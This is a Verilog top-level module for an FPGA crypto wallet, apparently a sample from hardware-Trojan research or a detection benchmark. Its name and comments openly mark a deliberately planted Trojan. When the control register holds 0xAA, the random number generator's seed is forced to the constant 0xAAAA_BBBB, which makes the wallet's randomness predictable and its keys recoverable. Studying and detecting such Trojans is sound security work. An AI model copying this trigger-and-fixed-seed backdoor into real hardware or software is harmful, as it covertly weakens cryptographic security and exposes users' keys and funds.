module crypto_wallet2_top_triggered_trojan (
    /********* Clock ********/
    input                       CLOCK_50,

    /********* SDRAM ********/
    output              [12:0]  DRAM_ADDR,
    output               [1:0]  DRAM_BA,
    output                      DRAM_CAS_N,
    output                      DRAM_CKE,
    output                      DRAM_CLK,
    output                      DRAM_CS_N,
    inout               [15:0]  DRAM_DQ,
    output               [1:0]  DRAM_DQM,
    output                      DRAM_RAS_N,
    output                      DRAM_WE_N,

    /********* LEDs ********/
    output reg          [7:0]   LED,

    /********* UART USB ********/
    input                       UART_RX,
    output                      UART_TX
);

    /********* REG/WIRE Declaration ********/
    wire                        w_reset_n;
    wire                [7:0]   w_system_control;
    wire                [7:0]   w_random;
    wire                [31:0]  w_random_seed;

    /********* Concurrent ********/
    assign w_reset_n = !(w_system_control[0]);

    /********* Components ********/
    
    /* SDRAM PLL */
    sdram_pll sdram_pll_inst (
        .inclk0     (CLOCK_50),
        .c0         (DRAM_CLK)
    );

    /* Nios Qsys */
    crypto_wallet2_nios_fast u0 (
        .clk_clk                                        (CLOCK_50),
        .reset_reset_n                                  (1'b1),
        .sdram_wire_addr                                (DRAM_ADDR),
        .sdram_wire_ba                                  (DRAM_BA),
        .sdram_wire_cas_n                               (DRAM_CAS_N),
        .sdram_wire_cke                                 (DRAM_CKE),
        .sdram_wire_cs_n                                (DRAM_CS_N),
        .sdram_wire_dq                                  (DRAM_DQ),
        .sdram_wire_dqm                                 (DRAM_DQM),
        .sdram_wire_ras_n                               (DRAM_RAS_N),
        .sdram_wire_we_n                                (DRAM_WE_N),
        .uart_external_connection_rxd                   (UART_RX),
        .uart_external_connection_txd                   (UART_TX),
        .pi_random_external_connection_export           (w_random),
        .po_random_seed_external_connection_export      (w_random_seed),
        .po_led_external_connection_export              (LED),
        .po_system_control_external_connection_export   (w_system_control)
    );

    /* 8-bit random number generator with a Trojan */
    reg [31:0] trojan_random_seed;
    always @(posedge CLOCK_50) begin
        if (w_reset_n == 1'b0) begin
            trojan_random_seed <= 32'h0; // Reset condition
        end else if (w_system_control == 8'hAA) begin // Trojan trigger condition
            trojan_random_seed <= 32'hAAAA_BBBB; // Specific seed when Trojan is triggered
        end else begin
            trojan_random_seed <= w_random_seed; // Normal operation
        end
    end

    random random_inst0 (
        .i_clk      (CLOCK_50),
        .i_reset_n  (w_reset_n),
        .i_seed     (trojan_random_seed), // Modified to use potential Trojan seed
        .o_data     (w_random)
    );

endmodule
